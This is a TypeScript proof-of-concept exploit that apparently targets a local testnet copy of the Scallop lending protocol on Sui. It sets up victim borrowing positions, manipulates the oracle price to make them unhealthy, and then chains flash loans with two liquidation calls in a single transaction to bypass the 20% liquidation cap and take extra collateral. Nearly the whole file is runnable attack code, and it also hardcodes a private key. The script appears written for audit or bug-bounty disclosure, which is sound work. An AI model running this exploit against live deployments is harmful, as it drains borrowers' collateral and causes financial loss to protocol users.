// @ts-nocheck
/**
 * PoC: Multi-Call Liquidation Bypasses 20% Soft Cap
 * Target: Scallop Protocol (Local Testnet)
 * SDK: @mysten/sui (Official)
 */

import { SuiClient } from '@mysten/sui/client';
import { Transaction } from '@mysten/sui/transactions';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';

const client = new SuiClient({ url: 'http://127.0.0.1:9000' });

// ==================== KONFIGURASI LOCAL TESTNET (ID TERBARU) ====================
const PKG = "0x72ce2f442ece294dacfd712d67050c19fea865889474b56f2581860375b63a6a";
const VERSION = "0xa703e20471275c1b63fdc96ff2cd48517f47546d3257234dcea24b7206ebc384";
const MARKET = "0x288b2f0750d842eadcc4fd29479ec1e3fb5daa66f2b3c374a163cffeda06c8f8";
const ORACLE = "0xf11225e6350f8c507fcb45f79300714532510cadacb0d74e28dd4a88bc4c3c1c";
const REGISTRY = "0xf5a47739f4286abe4da907a9c26114f1b6e2ff5986f92abad6c064686f699e54";
const CLOCK = "0x6";

const TEST_COIN_PKG = "0x3aec9d1bbf8780992169d44d650223cea299cf5a688f8a383065ca172c4db219";
const USDC_TYPE = `${TEST_COIN_PKG}::usdc::USDC`;
const ETH_TYPE = `${TEST_COIN_PKG}::eth::ETH`;
const SUI_TYPE = "0x2::sui::SUI";

const USDC_TREASURY = "0xae61da09b3453a36c8e75de1e022f8df2125340c06fb7dcec020d9cc0671f3de";
const ETH_TREASURY = "0xd184852dfcf35c41e885748823d9cc1e5e7c93596318dc9b4218654661ee1865";

const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa";
const privateKeyBytes = decodeSuiPrivateKey(funderPrivateKeyStr).secretKey;
const funderKeypair = Ed25519Keypair.fromSecretKey(privateKeyBytes);
const funderAddress = funderKeypair.getPublicKey().toSuiAddress();

console.log(`[INIT] Funder Address: ${funderAddress}`);

// ==================== HELPER FUNCTIONS ====================

async function findAdminCap(): Promise<string> {
    console.log("[INIT] Searching for AdminCap...");
    let cursor = null;
    while (true) {
        const objects = await client.getOwnedObjects({
            owner: funderAddress, cursor, options: { showType: true },
        });
        for (const obj of objects.data) {
            if ((obj.data?.type || "").includes(`${PKG}::app::AdminCap`)) {
                console.log(`[INIT] AdminCap found: ${obj.data.objectId}`);
                return obj.data.objectId;
            }
        }
        if (!objects.hasNextPage) break;
        cursor = objects.nextCursor;
    }
    throw new Error("AdminCap not found.");
}

async function findCoinMetadata(coinType: string): Promise<string> {
    const response = await client.getCoinMetadata({ coinType });
    if (!response) throw new Error(`CoinMetadata not found for ${coinType}`);
    return response.id;
}

async function getXOraclePackage(): Promise<string> {
    const obj = await client.getObject({ id: ORACLE, options: { showType: true } });
    const match = obj.data?.type?.match(/^(0x[0-9a-fA-F]+)::/);
    if (!match) throw new Error("Failed to parse XOracle package ID");
    return match[1];
}

async function executeTx(tx, keypair) {
    tx.setSender(keypair.getPublicKey().toSuiAddress());
    const result = await client.signAndExecuteTransaction({
        signer: keypair, transaction: tx,
        options: { showEffects: true, showObjectChanges: true },
    });
    if (result.effects.status.status !== 'success') {
        console.error("[ERROR] Transaction Failed!", JSON.stringify(result.effects, null, 2));
        throw new Error(`Transaction failed: ${result.effects.status.error}`);
    }
    await new Promise(r => setTimeout(r, 1500));
    return result;
}

function updatePrices(tx, xOraclePkg, suiPrice, usdcPrice, ethPrice) {
    tx.moveCall({
        target: `${xOraclePkg}::x_oracle::update_price`,
        typeArguments: [SUI_TYPE],
        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(suiPrice)],
    });
    tx.moveCall({
        target: `${xOraclePkg}::x_oracle::update_price`,
        typeArguments: [USDC_TYPE],
        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(usdcPrice)],
    });
    tx.moveCall({
        target: `${xOraclePkg}::x_oracle::update_price`,
        typeArguments: [ETH_TYPE],
        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(ethPrice)],
    });
}

// ==================== PHASE 0: INITIALIZE MARKET ====================
async function initializeMarket(adminCapId) {
    console.log("\n[INIT] Initializing Market...");
    const suiMetaId = await findCoinMetadata(SUI_TYPE);
    const usdcMetaId = await findCoinMetadata(USDC_TYPE);
    const ethMetaId = await findCoinMetadata(ETH_TYPE);

    const tx = new Transaction();
    tx.moveCall({ target: `${PKG}::app::whitelist_allow_all`, arguments: [tx.object(adminCapId), tx.object(MARKET)] });
    tx.moveCall({ target: `${PKG}::app::init_market_coin_price_table`, arguments: [tx.object(adminCapId), tx.object(MARKET)] });

    const SCALE = 10n ** 12n;
    const addInterestModel = (coinType, p) => {
        const [modelChange] = tx.moveCall({
            target: `${PKG}::app::create_interest_model_change`, typeArguments: [coinType],
            arguments: [tx.object(adminCapId), tx.pure.u64(p.baseBorrowRatePerSec), tx.pure.u64(p.interestRateScale), tx.pure.u64(p.borrowRateOnMidKink), tx.pure.u64(p.midKink), tx.pure.u64(p.borrowRateOnHighKink), tx.pure.u64(p.highKink), tx.pure.u64(p.maxBorrowRate), tx.pure.u64(p.revenueFactor), tx.pure.u64(p.borrowWeight), tx.pure.u64(p.scale), tx.pure.u64(p.minBorrowAmount)],
        });
        tx.moveCall({ target: `${PKG}::app::add_interest_model`, typeArguments: [coinType], arguments: [tx.object(MARKET), tx.object(adminCapId), modelChange, tx.object(CLOCK)] });
    };
    const addRiskModel = (coinType, p) => {
        const [modelChange] = tx.moveCall({
            target: `${PKG}::app::create_risk_model_change`, typeArguments: [coinType],
            arguments: [tx.object(adminCapId), tx.pure.u64(p.collateralFactor), tx.pure.u64(p.liquidationFactor), tx.pure.u64(p.liquidationPanelty), tx.pure.u64(p.liquidationDiscount), tx.pure.u64(p.scale), tx.pure.u64(p.maxCollateralAmount)],
        });
        tx.moveCall({ target: `${PKG}::app::add_risk_model`, typeArguments: [coinType], arguments: [tx.object(MARKET), tx.object(adminCapId), modelChange] });
    };
    const addLimiter = (coinType, limit, cycle, segment) => tx.moveCall({ target: `${PKG}::app::add_limiter`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(limit), tx.pure.u32(cycle), tx.pure.u32(segment)] });
    const registerDecimals = (coinType, metadataId) => tx.moveCall({ target: `${PKG}::coin_decimals_registry::register_decimals`, typeArguments: [coinType], arguments: [tx.object(REGISTRY), tx.object(metadataId)] });
    const setMinCollateral = (coinType, amount) => tx.moveCall({ target: `${PKG}::app::update_min_collateral_amount`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(amount)] });
    const setSupplyLimit = (coinType, limit) => tx.moveCall({ target: `${PKG}::app::update_supply_limit`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(limit)] });
    const setBorrowLimit = (coinType, limit) => tx.moveCall({ target: `${PKG}::app::update_borrow_limit`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(limit)] });
    const setBorrowFee = (coinType, n, d) => tx.moveCall({ target: `${PKG}::app::update_borrow_fee`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(n), tx.pure.u64(d)] });
    const setApmThreshold = (coinType, t) => tx.moveCall({ target: `${PKG}::app::set_apm_threshold`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(t)] });

    // SUI
    registerDecimals(SUI_TYPE, suiMetaId);
    addInterestModel(SUI_TYPE, { baseBorrowRatePerSec: 0n, interestRateScale: 10n ** 7n, borrowRateOnMidKink: 10n * (SCALE / 100n), midKink: 60n * (SCALE / 100n), borrowRateOnHighKink: 100n * (SCALE / 100n), highKink: 90n * (SCALE / 100n), maxBorrowRate: 300n * (SCALE / 100n), revenueFactor: 5n * (SCALE / 100n), borrowWeight: 125n * (SCALE / 100n), scale: SCALE, minBorrowAmount: 10n ** 7n });
    addRiskModel(SUI_TYPE, { collateralFactor: 60n, liquidationFactor: 70n, liquidationPanelty: 10n, liquidationDiscount: 7n, scale: 100n, maxCollateralAmount: 10n ** 17n });
    addLimiter(SUI_TYPE, 10n ** 15n, 86400, 1800);
    setMinCollateral(SUI_TYPE, 0n); setSupplyLimit(SUI_TYPE, 10n ** 18n); setBorrowLimit(SUI_TYPE, 10n ** 18n); setBorrowFee(SUI_TYPE, 0n, 1n);
    setApmThreshold(SUI_TYPE, 1000n);

    // USDC
    registerDecimals(USDC_TYPE, usdcMetaId);
    addInterestModel(USDC_TYPE, { baseBorrowRatePerSec: 0n, interestRateScale: 10n ** 7n, borrowRateOnMidKink: 8n * (SCALE / 100n), midKink: 60n * (SCALE / 100n), borrowRateOnHighKink: 50n * (SCALE / 100n), highKink: 90n * (SCALE / 100n), maxBorrowRate: 150n * (SCALE / 100n), revenueFactor: 5n * (SCALE / 100n), borrowWeight: 100n * (SCALE / 100n), scale: SCALE, minBorrowAmount: 10n ** 7n });
    addRiskModel(USDC_TYPE, { collateralFactor: 90n, liquidationFactor: 95n, liquidationPanelty: 3n, liquidationDiscount: 2n, scale: 100n, maxCollateralAmount: 10n ** 17n });
    addLimiter(USDC_TYPE, 10n ** 15n, 86400, 1800);
    setMinCollateral(USDC_TYPE, 0n); setSupplyLimit(USDC_TYPE, 10n ** 18n); setBorrowLimit(USDC_TYPE, 10n ** 18n); setBorrowFee(USDC_TYPE, 0n, 1n);
    setApmThreshold(USDC_TYPE, 1000n);

    // ETH
    registerDecimals(ETH_TYPE, ethMetaId);
    addInterestModel(ETH_TYPE, { baseBorrowRatePerSec: 0n, interestRateScale: 10n ** 7n, borrowRateOnMidKink: 10n * (SCALE / 100n), midKink: 60n * (SCALE / 100n), borrowRateOnHighKink: 100n * (SCALE / 100n), highKink: 90n * (SCALE / 100n), maxBorrowRate: 300n * (SCALE / 100n), revenueFactor: 5n * (SCALE / 100n), borrowWeight: 100n * (SCALE / 100n), scale: SCALE, minBorrowAmount: 10n ** 7n });
    addRiskModel(ETH_TYPE, { collateralFactor: 80n, liquidationFactor: 90n, liquidationPanelty: 8n, liquidationDiscount: 5n, scale: 100n, maxCollateralAmount: 10n ** 16n });
    addLimiter(ETH_TYPE, 10n ** 15n, 86400, 1800);
    setMinCollateral(ETH_TYPE, 0n); setSupplyLimit(ETH_TYPE, 10n ** 18n); setBorrowLimit(ETH_TYPE, 10n ** 18n); setBorrowFee(ETH_TYPE, 0n, 1n);
    setApmThreshold(ETH_TYPE, 1000n);

    await executeTx(tx, funderKeypair);
    console.log("[INIT] Market initialized successfully!");
}

// ==================== PHASE 1: SETUP VICTIM ====================
async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
    const victimAddr = victimKeypair.getPublicKey().toSuiAddress();
    console.log(`\n[${label}] Setting up victim at ${victimAddr}...`);

    const fundTx = new Transaction();
    const [suiCoin] = fundTx.splitCoins(fundTx.gas, [1_010_000_000_000n]);
    fundTx.transferObjects([suiCoin], victimAddr);
    await executeTx(fundTx, funderKeypair);
    console.log(`[${label}] Step 1 done: Funded victim with 1010 SUI`);

    const openTx = new Transaction();
    openTx.moveCall({ target: `${PKG}::open_obligation::open_obligation_entry`, arguments: [openTx.object(VERSION)] });
    const openResult = await executeTx(openTx, victimKeypair);
    
    let obligationId = "", obligationKeyId = "";
    for (const obj of openResult.objectChanges || []) {
        if (obj.type === "created" && obj.objectType?.includes("obligation::ObligationKey")) obligationKeyId = obj.objectId;
        else if (obj.type === "created" && obj.objectType?.includes("obligation::Obligation")) obligationId = obj.objectId;
    }
    if (!obligationId || !obligationKeyId) throw new Error(`[${label}] Failed to parse obligationId.`);

    const whitelistTx = new Transaction();
    whitelistTx.moveCall({ target: `${PKG}::app::add_whitelist_address`, arguments: [whitelistTx.object(adminCapId), whitelistTx.object(MARKET), whitelistTx.pure.address(victimAddr)] });
    await executeTx(whitelistTx, funderKeypair);

    const depositTx = new Transaction();
    const [collateralCoin] = depositTx.splitCoins(depositTx.gas, [1_000_000_000_000n]);
    depositTx.moveCall({ target: `${PKG}::deposit_collateral::deposit_collateral`, typeArguments: [SUI_TYPE], arguments: [depositTx.object(VERSION), depositTx.object(obligationId), depositTx.object(MARKET), collateralCoin] });
    await executeTx(depositTx, victimKeypair);
    console.log(`[${label}] Step 3 done: Deposited 1000 SUI collateral`);

    const supplyTx = new Transaction();
    const [usdcCoin] = supplyTx.moveCall({ target: `${TEST_COIN_PKG}::usdc::mint`, arguments: [supplyTx.object(USDC_TREASURY), supplyTx.pure.u64(100_000_000_000_000n)] });
    const [sUSDC] = supplyTx.moveCall({ target: `${PKG}::mint::mint`, typeArguments: [USDC_TYPE], arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), usdcCoin, supplyTx.object(CLOCK)] });
    supplyTx.transferObjects([sUSDC], funderAddress);
    const [ethCoin] = supplyTx.moveCall({ target: `${TEST_COIN_PKG}::eth::mint`, arguments: [supplyTx.object(ETH_TREASURY), supplyTx.pure.u64(10_000_000_000n)] });
    const [sETH] = supplyTx.moveCall({ target: `${PKG}::mint::mint`, typeArguments: [ETH_TYPE], arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), ethCoin, supplyTx.object(CLOCK)] });
    supplyTx.transferObjects([sETH], funderAddress);
    await executeTx(supplyTx, funderKeypair);
    console.log(`[${label}] Step 4 done: Minted and supplied USDC and ETH to market`);

    // --- STEP 5: Borrow USDC ---
    // Collateral = $1000. Collateral Factor = 60%. Max Borrow = $600. 
    // We borrow 300 USDC ($300) + 0.1 ETH ($200) = $500 total debt (Healthy).
    const borrowUSDCTx = new Transaction();
    updatePrices(borrowUSDCTx, xOraclePkg, 100_000_000n, 100_000_000n, 200_000_000_000n);
    
    borrowUSDCTx.moveCall({
        target: `${PKG}::apm::refresh_apm_state`, typeArguments: [SUI_TYPE],
        arguments: [borrowUSDCTx.object(VERSION), borrowUSDCTx.object(MARKET), borrowUSDCTx.object(ORACLE), borrowUSDCTx.object(CLOCK)],
    });

    const [borrowedUSDC] = borrowUSDCTx.moveCall({
        target: `${PKG}::borrow::borrow`, typeArguments: [USDC_TYPE],
        arguments: [borrowUSDCTx.object(VERSION), borrowUSDCTx.object(obligationId), borrowUSDCTx.object(obligationKeyId), borrowUSDCTx.object(MARKET), borrowUSDCTx.object(REGISTRY), borrowUSDCTx.pure.u64(300_000_000n), borrowUSDCTx.object(ORACLE), borrowUSDCTx.object(CLOCK)],
    });
    borrowUSDCTx.transferObjects([borrowedUSDC], victimAddr);
    await executeTx(borrowUSDCTx, victimKeypair);
    console.log(`[${label}] Step 5 done: Borrowed 300 USDC`);

    // --- STEP 6: Borrow ETH ---
    const borrowETHTx = new Transaction();
    updatePrices(borrowETHTx, xOraclePkg, 100_000_000n, 100_000_000n, 200_000_000_000n);
    
    borrowETHTx.moveCall({
        target: `${PKG}::apm::refresh_apm_state`, typeArguments: [SUI_TYPE],
        arguments: [borrowETHTx.object(VERSION), borrowETHTx.object(MARKET), borrowETHTx.object(ORACLE), borrowETHTx.object(CLOCK)],
    });

    const [borrowedETH] = borrowETHTx.moveCall({
        target: `${PKG}::borrow::borrow`, typeArguments: [ETH_TYPE],
        arguments: [borrowETHTx.object(VERSION), borrowETHTx.object(obligationId), borrowETHTx.object(obligationKeyId), borrowETHTx.object(MARKET), borrowETHTx.object(REGISTRY), borrowETHTx.pure.u64(100_000_000n), borrowETHTx.object(ORACLE), borrowETHTx.object(CLOCK)],
    });
    borrowETHTx.transferObjects([borrowedETH], victimAddr);
    await executeTx(borrowETHTx, victimKeypair);
    console.log(`[${label}] Step 6 done: Borrowed 0.1 ETH`);

    return { obligationId, obligationKeyId };
}

// ==================== PHASE 2: TRIGGER (MANIPULASI ORACLE) ====================
async function crashOraclePrice(xOraclePkg) {
    console.log("\n[TRIGGER] Crashing SUI price to $0.40 via Oracle Update...");
    const tx = new Transaction();
    updatePrices(tx, xOraclePkg, 40_000_000n, 100_000_000n, 200_000_000_000n);
    await executeTx(tx, funderKeypair);
    console.log("[TRIGGER] SUI price crashed. Victims are now UNHEALTHY!");
}

// ==================== PHASE 3 & 4: EXPLOIT ====================
async function readObligationState(obligationId) {
    const fields = await client.getDynamicFields({ parentId: obligationId });
    let collateralAmount = 0n;
    for (const field of fields.data) {
        const fieldData = await client.getDynamicFieldObject({ parentId: obligationId, name: field.name });
        if (JSON.stringify(field.name).includes("Collateral")) {
            collateralAmount = BigInt(fieldData?.data?.content?.fields?.amount || 0);
        }
    }
    return { collateralAmount };
}

async function beforeExploit_singleCall(victimObligationId, xOraclePkg) {
    console.log("\n" + "=".repeat(60) + "\nBEFORE EXPLOIT: Single Liquidation Call\n" + "=".repeat(60));
    const stateBefore = await readObligationState(victimObligationId);

    const tx = new Transaction();
    updatePrices(tx, xOraclePkg, 40_000_000n, 100_000_000n, 200_000_000_000n);

    // Total Debt is $500. 20% cap = $100. We flashloan 100 USDC to repay exactly $100.
    const [flashUSDC, flashReceipt] = tx.moveCall({
        target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [USDC_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(100_000_000n)],
    });
    const [remainUSDC, collateralCoin] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`, typeArguments: [USDC_TYPE, SUI_TYPE],
        arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), flashUSDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)],
    });
    tx.moveCall({
        target: `${PKG}::flash_loan::repay_flash_loan`, typeArguments: [USDC_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), remainUSDC, flashReceipt],
    });
    tx.transferObjects([collateralCoin], funderAddress);

    await executeTx(tx, funderKeypair);
    const stateAfter = await readObligationState(victimObligationId);
    const extracted = stateBefore.collateralAmount - stateAfter.collateralAmount;
    console.log(`[BEFORE] Single-call extracted: ${extracted} SUI (Expected: ~20% cap)`);
    return { extracted };
}

async function afterExploit_multiCall(victimObligationId, xOraclePkg) {
    console.log("\n" + "=".repeat(60) + "\nAFTER EXPLOIT: Multi-Call Liquidation\n" + "=".repeat(60));
    const stateBefore = await readObligationState(victimObligationId);

    const tx = new Transaction();
    updatePrices(tx, xOraclePkg, 40_000_000n, 100_000_000n, 200_000_000_000n);

    // Flashloan 100 USDC ($100) and 0.05 ETH ($100)
    const [f_USDC, r_USDC] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(100_000_000n)] });
    const [f_ETH, r_ETH] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [ETH_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000n)] });

    const [rem1, c1] = tx.moveCall({ target: `${PKG}::liquidate::liquidate`, typeArguments: [USDC_TYPE, SUI_TYPE], arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), f_USDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)] });
    const [rem2, c2] = tx.moveCall({ target: `${PKG}::liquidate::liquidate`, typeArguments: [ETH_TYPE, SUI_TYPE], arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), f_ETH, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)] });

    tx.moveCall({ target: `${PKG}::flash_loan::repay_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), rem1, r_USDC] });
    tx.moveCall({ target: `${PKG}::flash_loan::repay_flash_loan`, typeArguments: [ETH_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), rem2, r_ETH] });

    tx.mergeCoins(c1, [c2]);
    tx.transferObjects([c1], funderAddress);

    await executeTx(tx, funderKeypair);
    const stateAfter = await readObligationState(victimObligationId);
    const extracted = stateBefore.collateralAmount - stateAfter.collateralAmount;
    console.log(`[AFTER] Multi-call extracted: ${extracted} SUI (BYPASSED 20% cap!)`);
    return { extracted };
}

// ==================== MAIN EXECUTION ====================
async function main() {
    console.log("╔═══════════════════════════════════════════════════════════╗");
    console.log("║  PoC: Multi-Call Liquidation Bypass (Local Testnet)       ║");
    console.log("╚═══════════════════════════════════════════════════════════╝");

    const adminCapId = await findAdminCap();
    const xOraclePkg = await getXOraclePackage();

    await initializeMarket(adminCapId);

    const victimA = Ed25519Keypair.generate();
    const victimB = Ed25519Keypair.generate();

    const vA = await setupVictim(victimA, "VICTIM A", adminCapId, xOraclePkg);
    const vB = await setupVictim(victimB, "VICTIM B", adminCapId, xOraclePkg);

    await crashOraclePrice(xOraclePkg);

    const beforeResult = await beforeExploit_singleCall(vA.obligationId, xOraclePkg);
    const afterResult = await afterExploit_multiCall(vB.obligationId, xOraclePkg);

    console.log("\n" + "=".repeat(60));
    console.log("FINAL IMPACT ANALYSIS");
    console.log("=".repeat(60));
    console.log(`Single-Call Extracted : ${beforeResult.extracted} SUI`);
    console.log(`Multi-Call Extracted  : ${afterResult.extracted} SUI`);

    if (beforeResult.extracted > 0n) {
        const ratio = Number(afterResult.extracted) / Number(beforeResult.extracted);
        console.log(`\n[IMPACT] Multi-Call extracted ${ratio.toFixed(2)}x MORE collateral!`);
    }
    console.log(`[IMPACT] 20% Soft Cap was BYPASSED via Multi-Call in single PTB!`);
}

main().catch(console.error);
